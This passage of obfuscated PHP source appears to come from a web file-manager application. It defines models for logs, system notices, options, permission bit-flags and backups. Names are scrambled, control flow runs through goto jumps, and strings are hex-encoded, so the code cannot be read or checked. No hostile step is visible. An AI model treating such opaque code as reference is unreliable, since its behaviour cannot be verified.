json_decode($bš·ßë¯èª[$b¢„Ì·ùÆ¯[2479]], !0); foreach ($dÇñ’³¨¶ö as $cøåŞÆÃ©) { if (!IO::init($cøåŞÆÃ©[$b¢„Ì·ùÆ¯[75]])) { continue; } if (!($cŞÑÙÚ÷Ëà = IO::infoFull($cøåŞÆÃ©[$b¢„Ì·ùÆ¯[75]]))) { continue; } $bš·ßë¯èª[$b¢„Ì·ùÆ¯[75]] = $cøåŞÆÃ©[$b¢„Ì·ùÆ¯[75]]; $cù—¡Ç•‹ˆ[] = $bš·ßë¯èª[$b¢„Ì·ùÆ¯[369]] = $cŞÑÙÚ÷Ëà[$b¢„Ì·ùÆ¯[369]]; $cù—¡Ç•‹ˆ[] = $bš·ßë¯èª[$b¢„Ì·ùÆ¯[2297]] = $cŞÑÙÚ÷Ëà[$b¢„Ì·ùÆ¯[461]]; break; } return $bš·ßë¯èª; } private function getSourceList(&$BéƒèÅéêà) { $DÌªˆ–‹ÙÒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $a†Û†•Ş·ß = array(); foreach ($BéƒèÅéêà as $fˆ‚ƒä—­ => $aø¯´»Ç†) { goto BŸ“šŞÍˆƒ; aõîÑ¡¬ï: $a†Û†•Ş·ß[] = $AŞù™¿±ˆ¿[$DÌªˆ–‹ÙÒ[369]]; $a†Û†•Ş·ß[] = $AŞù™¿±ˆ¿[$DÌªˆ–‹ÙÒ[2297]]; if ($AŞù™¿±ˆ¿[$DÌªˆ–‹ÙÒ[29]] == $DÌªˆ–‹ÙÒ[492]) { $a†Û†•Ş·ß[] = $AŞù™¿±ˆ¿[$DÌªˆ–‹ÙÒ[405]][$DÌªˆ–‹ÙÒ[1011]]; $a†Û†•Ş·ß[] = $AŞù™¿±ˆ¿[$DÌªˆ–‹ÙÒ[405]][$DÌªˆ–‹ÙÒ[1012]]; } goto C¾ƒ®ˆ‚‡; BŸ“šŞÍˆƒ: $AŞù™¿±ˆ¿ = json_decode($aø¯´»Ç†[$DÌªˆ–‹ÙÒ[405]], !0); if ($aø¯´»Ç†[$DÌªˆ–‹ÙÒ[29]] == $DÌªˆ–‹ÙÒ[2084]) { $AŞù™¿±ˆ¿ = $this->descZipDownload($AŞù™¿±ˆ¿, $a†Û†•Ş·ß); $BéƒèÅéêà[$fˆ‚ƒä—­][$DÌªˆ–‹ÙÒ[405]] = json_encode($AŞù™¿±ˆ¿); continue; } if (strpos($aø¯´»Ç†[$DÌªˆ–‹ÙÒ[29]], $DÌªˆ–‹ÙÒ[2298]) !== 0) { goto a±âŒ‚ë©; a±âŒ‚ë©: if (!isset($AŞù™¿±ˆ¿[$DÌªˆ–‹ÙÒ[75]]) || strpos($aø¯´»Ç†[$DÌªˆ–‹ÙÒ[29]], $DÌªˆ–‹ÙÒ[2480]) !== 0) { continue; } if (!IO::init($AŞù™¿±ˆ¿[$DÌªˆ–‹ÙÒ[75]])) { continue; } if (!($aïÆÃ°àï = IO::infoFull($AŞù™¿±ˆ¿[$DÌªˆ–‹ÙÒ[75]]))) { continue; } goto Dƒª„ÜºÕ; eĞ­ïÔõ: continue; goto d¾´Ş¥²; Dƒª„ÜºÕ: $a†Û†•Ş·ß[] = $AŞù™¿±ˆ¿[$DÌªˆ–‹ÙÒ[369]] = $aïÆÃ°àï[$DÌªˆ–‹ÙÒ[369]]; $a†Û†•Ş·ß[] = $AŞù™¿±ˆ¿[$DÌªˆ–‹ÙÒ[2297]] = $aïÆÃ°àï[$DÌªˆ–‹ÙÒ[461]]; $BéƒèÅéêà[$fˆ‚ƒä—­][$DÌªˆ–‹ÙÒ[405]] = json_encode($AŞù™¿±ˆ¿); goto eĞ­ïÔõ; d¾´Ş¥²: } goto aõîÑ¡¬ï; C¾ƒ®ˆ‚‡: if ($AŞù™¿±ˆ¿[$DÌªˆ–‹ÙÒ[29]] == $DÌªˆ–‹ÙÒ[2305]) { $a†Û†•Ş·ß[] = $AŞù™¿±ˆ¿[$DÌªˆ–‹ÙÒ[405]][$DÌªˆ–‹ÙÒ[369]]; } goto aÙ°ÜÄµŠ; aÙ°ÜÄµŠ: } if (!$a†Û†•Ş·ß) { return array(); } return Model($DÌªˆ–‹ÙÒ[756])->sourceListInfo($a†Û†•Ş·ß, !0); } private function logList($e¼¬†´“•ğ) { goto E³„ƒĞÑŠ; d£ÜÁøçÃÂ: return $D™¾œòâ‡Û; goto c ƒƒ©…Æ; E³„ƒĞÑŠ: $fÍ×˜Å­Ï =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eİ‹Àé¨éí = array_to_keyvalue($e¼¬†´“•ğ, $fÍ×˜Å­Ï[33], $fÍ×˜Å­Ï[1445]); $fµ¯°”µêÛ = Model($fÍ×˜Å­Ï[477])->userListInfo(array_unique($eİ‹Àé¨éí)); goto a–æ±¹Š; a–æ±¹Š: $fªàìÂÇÚÚ = $this->getSourceList($e¼¬†´“•ğ); $AëƒÚ›í¤ = $this->typeAll(); $D™¾œòâ‡Û = array(); goto D‘ÑÓÆÓÚ; D‘ÑÓÆÓÚ: $Dİ£ê·¿Æ = array(); foreach ($e¼¬†´“•ğ as $E³ğšŸ£‡ => $b‡âå–—î) { goto C‚”Æè‹ Š; C‚”Æè‹ Š: $F¹ÜŸÕñÍ = $b‡âå–—î[$fÍ×˜Å­Ï[29]]; $d²²Ï²êæ = isset($fµ¯°”µêÛ[$b‡âå–—î[$fÍ×˜Å­Ï[1445]]]) ? $fµ¯°”µêÛ[$b‡âå–—î[$fÍ×˜Å­Ï[1445]]] : !1; $cÒİ´”¶ôæ = strpos($F¹ÜŸÕñÍ, $fÍ×˜Å­Ï[2481]) === 0 ? LNG($fÍ×˜Å­Ï[2482]) : LNG($fÍ×˜Å­Ï[2477]); goto C¨È„ÉÛ÷¾; D¸¾¬µÏ©: $this->ipAddress($b‡âå–—î); if (strpos($F¹ÜŸÕñÍ, $fÍ×˜Å­Ï[2298]) === 0 || isset($b†§–ä¶[$fÍ×˜Å­Ï[2297]])) { goto a¦µ™«²à±; a¦µ™«²à±: $b†§–ä¶[$fÍ×˜Å­Ï[391]] = $fªàìÂÇÚÚ[$b†§–ä¶[$fÍ×˜Å­Ï[369]]]; $b†§–ä¶[$fÍ×˜Å­Ï[2310]] = $fªàìÂÇÚÚ[$b†§–ä¶[$fÍ×˜Å­Ï[2297]]]; if ($b†§–ä¶[$fÍ×˜Å­Ï[29]] == $fÍ×˜Å­Ï[492]) { $b†§–ä¶[$fÍ×˜Å­Ï[405]][$fÍ×˜Å­Ï[1011]] = $fªàìÂÇÚÚ[$b†§–ä¶[$fÍ×˜Å­Ï[405]][$fÍ×˜Å­Ï[1011]]]; $b†§–ä¶[$fÍ×˜Å­Ï[405]][$fÍ×˜Å­Ï[1012]] = $fªàìÂÇÚÚ[$b†§–ä¶[$fÍ×˜Å­Ï[405]][$fÍ×˜Å­Ï[1012]]]; } goto aÙ”¦ÁÌ‡Ã; cÇ²¡±ˆò²: if ($b†§–ä¶[$fÍ×˜Å­Ï[2310]] && $b†§–ä¶[$fÍ×˜Å­Ï[2310]][$fÍ×˜Å­Ï[371]] == $fÍ×˜Å­Ï[1084]) { $Dİ£ê·¿Æ[] = $b‡âå–—î[$fÍ×˜Å­Ï[367]]; unset($e¼¬†´“•ğ[$E³ğšŸ£‡]); continue; } goto E¡”ˆÕ÷º±; aÙ”¦ÁÌ‡Ã: if ($b†§–ä¶[$fÍ×˜Å­Ï[29]] == $fÍ×˜Å­Ï[2305]) { $b†§–ä¶[$fÍ×˜Å­Ï[405]][$fÍ×˜Å­Ï[369]] = $fªàìÂÇÚÚ[$b†§–ä¶[$fÍ×˜Å­Ï[405]][$fÍ×˜Å­Ï[369]]]; } if ($b†§–ä¶[$fÍ×˜Å­Ï[29]] == $fÍ×˜Å­Ï[2079]) { $b†§–ä¶[$fÍ×˜Å­Ï[2310]] = $b†§–ä¶[$fÍ×˜Å­Ï[391]]; $b†§–ä¶[$fÍ×˜Å­Ï[2297]] = $b†§–ä¶[$fÍ×˜Å­Ï[2310]][$fÍ×˜Å­Ï[369]]; $b†§–ä¶[$fÍ×˜Å­Ï[391]] = !1; $b†§–ä¶[$fÍ×˜Å­Ï[369]] = $fÍ×˜Å­Ï[33]; } if ($b†§–ä¶[$fÍ×˜Å­Ï[391]] && $b†§–ä¶[$fÍ×˜Å­Ï[391]][$fÍ×˜Å­Ï[371]] == $fÍ×˜Å­Ï[1084]) { $Dİ£ê·¿Æ[] = $b‡âå–—î[$fÍ×˜Å­Ï[367]]; unset($e¼¬†´“•ğ[$E³ğšŸ£‡]); continue; } goto cÇ²¡±ˆò²; E¡”ˆÕ÷º±: } $b‡âå–—î[$fÍ×˜Å­Ï[405]] = $b†§–ä¶; goto f…ÈÓ—’¤ ; C¨È„ÉÛ÷¾: $b‡âå–—î[$fÍ×˜Å­Ï[28]] = isset($d²²Ï²êæ[$fÍ×˜Å­Ï[28]]) ? $d²²Ï²êæ[$fÍ×˜Å­Ï[28]] : LNG($fÍ×˜Å­Ï[2477]); $b‡âå–—î[$fÍ×˜Å­Ï[2345]] = isset($d²²Ï²êæ[$fÍ×˜Å­Ï[2345]]) ? $d²²Ï²êæ[$fÍ×˜Å­Ï[2345]] : $fÍ×˜Å­Ï[33]; $b‡âå–—î[$fÍ×˜Å­Ï[1351]] = isset($AëƒÚ›í¤[$F¹ÜŸÕñÍ]) ? $AëƒÚ›í¤[$F¹ÜŸÕñÍ] : $cÒİ´”¶ôæ; goto DáŞ²‘ßñ; f…ÈÓ—’¤ : unset($b‡âå–—î[$fÍ×˜Å­Ï[2483]]); $D™¾œòâ‡Û[] = $b‡âå–—î; goto eôÍ¼ÑàÅŸ; DáŞ²‘ßñ: $b‡âå–—î[$fÍ×˜Å­Ï[2253]] = $d²²Ï²êæ; $b†§–ä¶ = json_decode($b‡âå–—î[$fÍ×˜Å­Ï[405]], !0); $b‡âå–—î[$fÍ×˜Å­Ï[2476]] = isset($b†§–ä¶[$fÍ×˜Å­Ï[2476]]) ? $b†§–ä¶[$fÍ×˜Å­Ï[2476]] : $fÍ×˜Å­Ï[33]; goto D¸¾¬µÏ©; eôÍ¼ÑàÅŸ: } $this->clearSystemPathLog($Dİ£ê·¿Æ); goto d£ÜÁøçÃÂ; c ƒƒ©…Æ: } private function clearSystemPathLog($Bˆ”²„Œ÷) { $dõ÷“á‡´¬ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (count($Bˆ”²„Œ÷) == 0) { return; } $D˜‰íÂÆ²Ë = array($dõ÷“á‡´¬[367] => array($dõ÷“á‡´¬[7], array_unique($Bˆ”²„Œ÷))); $this->where($D˜‰íÂÆ²Ë)->delete(); } public function deviceList($f÷êÆŒøö¼, $B³‹İÆÄ®¤ = 0) { $BÕİµâÙ©Õ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EÕ ÅÅœ—ï = array($BÕİµâÙ©Õ[1445] => $f÷êÆŒøö¼, $BÕİµâÙ©Õ[187] => array($BÕİµâÙ©Õ[932], $B³‹İÆÄ®¤), $BÕİµâÙ©Õ[29] => $BÕİµâÙ©Õ[2052]); $A†ğÇêÉŒ = array(); $bÎá©æåÆ = $this->field($BÕİµâÙ©Õ[2484])->where($EÕ ÅÅœ—ï)->order($BÕİµâÙ©Õ[2308])->limit(50)->select(); foreach ($bÎá©æåÆ as $e¾³õ‘î‘ => $d‚ïÛ¬–ù¿) { goto D“£†äÁºî; D“£†äÁºî: if ($e¾³õ‘î‘ > 0 && abs($d‚ïÛ¬–ù¿[$BÕİµâÙ©Õ[187]] - $bÎá©æåÆ[$e¾³õ‘î‘ - 1][$BÕİµâÙ©Õ[187]]) < 5) { continue; } $a‹ŞĞÓĞÛ  = json_decode($d‚ïÛ¬–ù¿[$BÕİµâÙ©Õ[405]], !0); $d‚ïÛ¬–ù¿[$BÕİµâÙ©Õ[2476]] = isset($a‹ŞĞÓĞÛ [$BÕİµâÙ©Õ[2476]]) ? $a‹ŞĞÓĞÛ [$BÕİµâÙ©Õ[2476]] : $BÕİµâÙ©Õ[33]; goto Dãß­¸õŞä; Dãß­¸õŞä: unset($a‹ŞĞÓĞÛ [$BÕİµâÙ©Õ[2476]]); $e…‡ñëª¶ƒ = $this->deviceType($a‹ŞĞÓĞÛ [$BÕİµâÙ©Õ[2299]]); if (isset($A†ğÇêÉŒ[$e…‡ñëª¶ƒ])) { continue; } goto AË† ³æ¾¶; AË† ³æ¾¶: $this->ipAddress($d‚ïÛ¬–ù¿); $d‚ïÛ¬–ù¿[$BÕİµâÙ©Õ[405]] = $a‹ŞĞÓĞÛ ; $A†ğÇêÉŒ[$e…‡ñëª¶ƒ] = $d‚ïÛ¬–ù¿; goto cù¯¯¥õ¡œ; cù¯¯¥õ¡œ: } return array_values($A†ğÇêÉŒ); } public function deviceType($EÙğÊ™³¬) { return $EÙğÊ™³¬; } } goto DîÂï¶‰¿Ú; DîÂï¶‰¿Ú: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\x2e\156\x6f\164\151\x63\x65\x4c\x69\x73\164"; public $field = array("\156\141\155\145", "\143\157\x6e\164\x65\x6e\x74", "\141\x75\x74\150", "\x6d\157\144\145", "\x74\x69\155\145", "\164\171\x70\145", "\x6c\145\x76\145\154", "\145\x6e\x61\x62\x6c\x65", "\x73\157\x72\x74"); public function listData($AêØ“‘Æˆæ = false, $bÎ†š˜â›ø = "\x73\x6f\162\164", $DªÒ—â˜•ø = false) { return parent::listData($AêØ“‘Æˆæ, $bÎ†š˜â›ø, $DªÒ—â˜•ø); } public function add($Eìî›İù°‡) { $a†ÊÌìè¿ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aƒØàÑÚÕù = time(); if ($Eìî›İù°‡[$a†ÊÌìè¿[12]] == $a†ÊÌìè¿[2485]) { $aƒØàÑÚÕù = strtotime($Eìî›İù°‡[$a†ÊÌìè¿[190]]); } $Eìî›İù°‡[$a†ÊÌìè¿[190]] = $aƒØàÑÚÕù; return parent::insert($Eìî›İù°‡); } public function update($BèƒÔæ±Ã, $Fßˆ  »×) { goto D±øÇ…¨×¬; fíùî¢Ôë÷: return parent::update($BèƒÔæ±Ã, $Fßˆ  »×); goto dÔª¥®Ûç“; D±øÇ…¨×¬: $fÉìÓ¼‹–… =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fÄÔœŒ× = $this->listData($BèƒÔæ±Ã); if (!$fÄÔœŒ×) { return !1; } goto F¶„ë‰”Ä; F¶„ë‰”Ä: $DèÏ³‘ = time(); if ($Fßˆ  »×[$fÉìÓ¼‹–…[12]] == $fÉìÓ¼‹–…[2485]) { $DèÏ³‘ = strtotime($Fßˆ  »×[$fÉìÓ¼‹–…[190]]); } $Fßˆ  »×[$fÉìÓ¼‹–…[190]] = $DèÏ³‘; goto fíùî¢Ôë÷; dÔª¥®Ûç“: } public function remove($dÛÒÖ¥Çè) { $a­×”ŸÅö¯ = $this->listData($dÛÒÖ¥Çè); if (!$a­×”ŸÅö¯ || $a­×”ŸÅö¯[$_SERVER[³‘’¼äÑ™ÔÍ][1084]]) { return !1; } return parent::remove($dÛÒÖ¥Çè); } public function sort($FË‡ì¡Æ „, $F½ÎˆÆÂˆ) { return parent::update($FË‡ì¡Æ „, $F½ÎˆÆÂˆ); } public function enable($B•‘¶áªøˆ, $c±î¥¸“™¹) { return parent::update($B•‘¶áªøˆ, array($_SERVER[³‘’¼äÑ™ÔÍ][2486] => $c±î¥¸“™¹)); } private function initUserOption() { $FÑàì“Ó×¿ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->optionType = $FÑàì“Ó×¿[2487]; $this->modelType = $FÑàì“Ó×¿[2488]; $this->field = array($FÑàì“Ó×¿[2489], $FÑàì“Ó×¿[28], $FÑàì“Ó×¿[190], $FÑàì“Ó×¿[29], $FÑàì“Ó×¿[2490], $FÑàì“Ó×¿[692], $FÑàì“Ó×¿[183]); } public function userNoticeGet($D‚“Ê¯Ó½ = false) { $this->initUserOption(); return parent::listData($D‚“Ê¯Ó½, $_SERVER[³‘’¼äÑ™ÔÍ][367], !0); } public function userNoticeAdd($b±µîö„ĞŠ) { $Cƒô›Œ‹½ã =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->initUserOption(); $f˜…°‘¼• = $this->findByKey($Cƒô›Œ‹½ã[2489], $b±µîö„ĞŠ[$Cƒô›Œ‹½ã[367]]); if ($f˜…°‘¼•) { return !0; } $aáí„±Ÿµ£ = array($Cƒô›Œ‹½ã[2489] => $b±µîö„ĞŠ[$Cƒô›Œ‹½ã[367]], $Cƒô›Œ‹½ã[28] => $b±µîö„ĞŠ[$Cƒô›Œ‹½ã[28]], $Cƒô›Œ‹½ã[190] => $b±µîö„ĞŠ[$Cƒô›Œ‹½ã[190]], $Cƒô›Œ‹½ã[29] => isset($b±µîö„ĞŠ[$Cƒô›Œ‹½ã[29]]) ? $b±µîö„ĞŠ[$Cƒô›Œ‹½ã[29]] : 1, $Cƒô›Œ‹½ã[2490] => isset($b±µîö„ĞŠ[$Cƒô›Œ‹½ã[2490]]) ? $b±µîö„ĞŠ[$Cƒô›Œ‹½ã[2490]] : 0, $Cƒô›Œ‹½ã[692] => 0, $Cƒô›Œ‹½ã[183] => 0); return parent::insert($aáí„±Ÿµ£); } public function userNoticeEdit($b‰Â­§ŠÍ±, $BÕõµ•¾ˆğ) { $this->initUserOption(); return parent::update($b‰Â­§ŠÍ±, $BÕõµ•¾ˆğ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\x74\145\x6d\x5f\x6f\160\x74\151\x6f\156"; protected $jsonField = array("\155\145\156\x75", "\162\157\154\x65", "\x72\157\x6c\x65\107\x72\157\x75\x70", "\162\145\x67\x69\163\x74", "\145\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($d¸´»£ÜÁ) { return "\x53\171\x73\164\x65\x6d\117\160\x74\151\x6f\156\137{$d¸´»£ÜÁ}"; } protected function optionDefault($B¿áÚä¦÷ = '') { $eÛ‡·½ÒÜ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($B¿áÚä¦÷ == $eÛ‡·½ÒÜ[33]) { return $GLOBALS[$eÛ‡·½ÒÜ[6]][$eÛ‡·½ÒÜ[2491]]; } } } class SystemRecordModel extends ModelBaseLight { } goto cØ¤Ñ‹òË; aÄã¯¡½Æ»: define($_SERVER[³‘’¼äÑ™ÔÍ][227], 2); define($_SERVER[³‘’¼äÑ™ÔÍ][228], 3); define($_SERVER[³‘’¼äÑ™ÔÍ][229], 1); goto fİ·¯æˆøƒ; A¡Ÿ®××®Ü: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $cí¤¸Ñø˜• =& $_SERVER[³‘’¼äÑ™ÔÍ]; $DÏ†Ö¥´Åí = array(array($cí¤¸Ñø˜•[386] => LNG($cí¤¸Ñø˜•[2114]), $cí¤¸Ñø˜•[2115] => $cí¤¸Ñø˜•[2116], $cí¤¸Ñø˜•[2117] => 6, $cí¤¸Ñø˜•[2118] => 1, $cí¤¸Ñø˜•[2119] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($cí¤¸Ñø˜•[386] => LNG($cí¤¸Ñø˜•[2120]), $cí¤¸Ñø˜•[2115] => $cí¤¸Ñø˜•[2121], $cí¤¸Ñø˜•[2117] => 1, $cí¤¸Ñø˜•[2118] => 1, $cí¤¸Ñø˜•[2119] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($cí¤¸Ñø˜•[386] => LNG($cí¤¸Ñø˜•[2122]), $cí¤¸Ñø˜•[2115] => $cí¤¸Ñø˜•[2123], $cí¤¸Ñø˜•[2117] => 2, $cí¤¸Ñø˜•[2118] => 1, $cí¤¸Ñø˜•[2119] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($cí¤¸Ñø˜•[386] => LNG($cí¤¸Ñø˜•[2124]), $cí¤¸Ñø˜•[2115] => $cí¤¸Ñø˜•[2123], $cí¤¸Ñø˜•[2117] => 3, $cí¤¸Ñø˜•[2118] => 1, $cí¤¸Ñø˜•[2119] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($cí¤¸Ñø˜•[386] => LNG($cí¤¸Ñø˜•[2125]), $cí¤¸Ñø˜•[2115] => $cí¤¸Ñø˜•[2126], $cí¤¸Ñø˜•[2117] => 4, $cí¤¸Ñø˜•[2118] => 1, $cí¤¸Ñø˜•[2119] => self::AUTH_SHOW | self::AUTH_VIEW), array($cí¤¸Ñø˜•[386] => LNG($cí¤¸Ñø˜•[2127]), $cí¤¸Ñø˜•[2115] => $cí¤¸Ñø˜•[2128], $cí¤¸Ñø˜•[2117] => 5, $cí¤¸Ñø˜•[2118] => 1, $cí¤¸Ñø˜•[2119] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($cí¤¸Ñø˜•[386] => LNG($cí¤¸Ñø˜•[2129]), $cí¤¸Ñø˜•[2115] => $cí¤¸Ñø˜•[2130], $cí¤¸Ñø˜•[2117] => 7, $cí¤¸Ñø˜•[2118] => 1, $cí¤¸Ñø˜•[2119] => 0)); return $DÏ†Ö¥´Åí; } public static function authCheck($C™‡º¿ùœ, $AÓš‡È½Æ) { $C™‡º¿ùœ = intval($C™‡º¿ùœ); if (_get($GLOBALS, $_SERVER[³‘’¼äÑ™ÔÍ][457])) { return !0; } if ($C™‡º¿ùœ <= 0) { return !1; } if (($C™‡º¿ùœ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($C™‡º¿ùœ & $AÓš‡È½Æ); } public static function authCheckShow($b’´«–ÑÁè) { return self::authCheck($b’´«–ÑÁè, self::AUTH_SHOW); } public static function authCheckView($FŒ»¸îÂ¿‹) { return self::authCheck($FŒ»¸îÂ¿‹, self::AUTH_VIEW); } public static function authCheckDownload($CĞŒğß ßÒ) { return self::authCheck($CĞŒğß ßÒ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($DšÒ¹ß¸Š) { return self::authCheck($DšÒ¹ß¸Š, self::AUTH_UPLOAD); } public static function authCheckEdit($FÒœƒ²±¤ƒ) { return self::authCheck($FÒœƒ²±¤ƒ, self::AUTH_EDIT); } public static function authCheckRemove($EÏËˆ•˜–Ö) { return self::authCheck($EÏËˆ•˜–Ö, self::AUTH_REMOVE); } public static function authCheckShare($fÙ²ÎğØ£Œ) { return self::authCheck($fÙ²ÎğØ£Œ, self::AUTH_SHARE); } public static function authCheckComment($cŸ‘¥·¤Â) { return self::authCheck($cŸ‘¥·¤Â, self::AUTH_COMMENT); } public static function authCheckEvent($få¹ä¿´) { return self::authCheck($få¹ä¿´, self::AUTH_EVENT); } public static function authCheckRoot($E’Œ‚Ş‡¤…) { return self::authCheck($E’Œ‚Ş‡¤…, self::AUTH_ROOT); } public static function authDisable($bÄÂ¬°«Èî, $b«ê«Ï‚Ç) { if (intval($bÄÂ¬°«Èî) <= 0) { return 0; } return intval($bÄÂ¬°«Èî) & ~$b«ê«Ï‚Ç; } public $optionType = "\123\x79\x73\164\x65\155\x2e\x73\157\165\x72\x63\145\101\165\x74\150\x4c\151\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\x61\165\164\x68", "\x6c\141\x62\x65\x6c", "\144\x69\163\160\x6c\x61\171", "\163\171\x73\164\x65\x6d", "\x73\157\x72\164"); public function initData() { $aĞÌ‚©‡ = $this->authDefault(); foreach ($aĞÌ‚©‡ as $AÁñ¬œ†“) { $this->add($AÁñ¬œ†“); } } public function listData($Bà°ÄÖ·ØÔ = false, $E­­œÇÑ¼ = "\x73\157\162\x74", $EŸáä„›ç = false) { return parent::listData($Bà°ÄÖ·ØÔ, $E­­œÇÑ¼, $EŸáä„›ç); } public function update($a£ƒÍŒëİ£, $e‹Ó³®ìÄŒ) { $e¨†Æªš±ß =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b×¡‰µÎÃó = parent::listData($a£ƒÍŒëİ£); $cßİ›ÅË˜Ú = $this->findByName($e‹Ó³®ìÄŒ[$e¨†Æªš±ß[28]]); if (!$b×¡‰µÎÃó || $cßİ›ÅË˜Ú && $cßİ›ÅË˜Ú[$e¨†Æªš±ß[367]] != $b×¡‰µÎÃó[$e¨†Æªš±ß[367]]) { return !1; } $this->filterAuth($e‹Ó³®ìÄŒ[$e¨†Æªš±ß[376]]); return parent::update($a£ƒÍŒëİ£, $e‹Ó³®ìÄŒ); } public function remove($d…ØŒ‰‚èñ) { $FÙ¾Óß¹µ = parent::listData($d…ØŒ‰‚èñ); if (!$FÙ¾Óß¹µ || $FÙ¾Óß¹µ[$_SERVER[³‘’¼äÑ™ÔÍ][1084]]) { return !1; } return parent::remove($d…ØŒ‰‚èñ); } public function add($a™‘¦Ü”½ = array()) { goto aÑŞƒŒ¬†; aÑŞƒŒ¬†: $E†•í¸ç¯á =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($this->findByName($a™‘¦Ü”½[$E†•í¸ç¯á[28]])) { return !1; } $cÇ¶šäŒ™© = array($E†•í¸ç¯á[28] => $E†•í¸ç¯á[33], $E†•í¸ç¯á[376] => 1, $E†•í¸ç¯á[2131] => $E†•í¸ç¯á[2132], $E†•í¸ç¯á[2133] => 1, $E†•í¸ç¯á[1084] => 0, $E†•í¸ç¯á[2134] => 0); goto c£Œ Ë£Œ; BŒÅ×Ş«¼ó: return parent::insert($a™‘¦Ü”½); goto aøÏàÀÒ¾Õ; c£Œ Ë£Œ: $a™‘¦Ü”½ = array_merge($cÇ¶šäŒ™©, $a™‘¦Ü”½); $a™‘¦Ü”½[$E†•í¸ç¯á[2134]] = $this->getSort(); $this->filterAuth($a™‘¦Ü”½[$E†•í¸ç¯á[376]]); goto BŒÅ×Ş«¼ó; aøÏàÀÒ¾Õ: } private function getSort() { $cêƒ£‹°ëŞ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AˆÚÌ©¤Å = parent::listData(); $D·¡éÎÅ = array_to_keyvalue($AˆÚÌ©¤Å, $cêƒ£‹°ëŞ[33], $cêƒ£‹°ëŞ[2134]); return empty($D·¡éÎÅ) ? 0 : max($D·¡éÎÅ) + 1; } private function filterAuth(&$cìºÊÁ‹ˆç) { goto b¤™Õ”›È; C±ŸŸŸÑ²: foreach ($C·ß›ğ³İˆ as $e•ƒ­£ï) { if (isset($Cê»Ç»™¤’[$e•ƒ­£ï])) { $C·ß›ğ³İˆ = array_merge($C·ß›ğ³İˆ, $Cê»Ç»™¤’[$e•ƒ­£ï]); } } $C·ß›ğ³İˆ[] = self::AUTH_SHOW; $cìºÊÁ‹ˆç = array_sum(array_unique($C·ß›ğ³İˆ)); goto FŒ»­—ä…‹; A‚ö—´‹›: foreach ($aÉÒ°Íã£ß as $e•ƒ­£ï) { if ($cìºÊÁ‹ˆç & $e•ƒ­£ï) { $C·ß›ğ³İˆ[] = $e•ƒ­£ï; } } if (in_array(self::AUTH_ROOT, $C·ß›ğ³İˆ)) { $cìºÊÁ‹ˆç = array_sum($aÉÒ°Íã£ß); return; } $Cê»Ç»™¤’ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto C±ŸŸŸÑ²; b¤™Õ”›È: if (!$cìºÊÁ‹ˆç) { return; } $aÉÒ°Íã£ß = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $C·ß›ğ³İˆ = array(); goto A‚ö—´‹›; FŒ»­—ä…‹: } public function sort($e†¦É­‰Ÿˆ, $fĞ´ˆéÇ©¶) { return parent::update($e†¦É­‰Ÿˆ, $fĞ´ˆéÇ©¶); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\142\x61\x63\153\x75\x70\114\x69\x73\164"; public $field = array("\151\157", "\x6e\x61\155\145", "\x73\164\x61\x74\x75\x73", "\143\157\156\164\145\156\164", "\x72\x65\x73\165\154\164", "\x74\x69\155\x65\x46\162\157\155", "\164\x69\155\x65\x54\157"); public function config() { goto F‘¨½—µˆ´; A÷ù¾ÄŸ¦ô: $f”–Ş—•‹Õ = is_array($f”–Ş—•‹Õ) ? $f”–Ş—•‹Õ : array(); if (!isset($f”–Ş—•‹Õ[$B×¨ãÌŞõ˜[695]])) { $f”–Ş—•‹Õ[$B×¨ãÌŞõ˜[695]] = $B×¨ãÌŞõ˜[468]; } $Cí´¨£‘ß = array(); goto AëÕä°÷Êê; F‘¨½—µˆ´: $B×¨ãÌŞõ˜ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f”–Ş—•‹Õ = 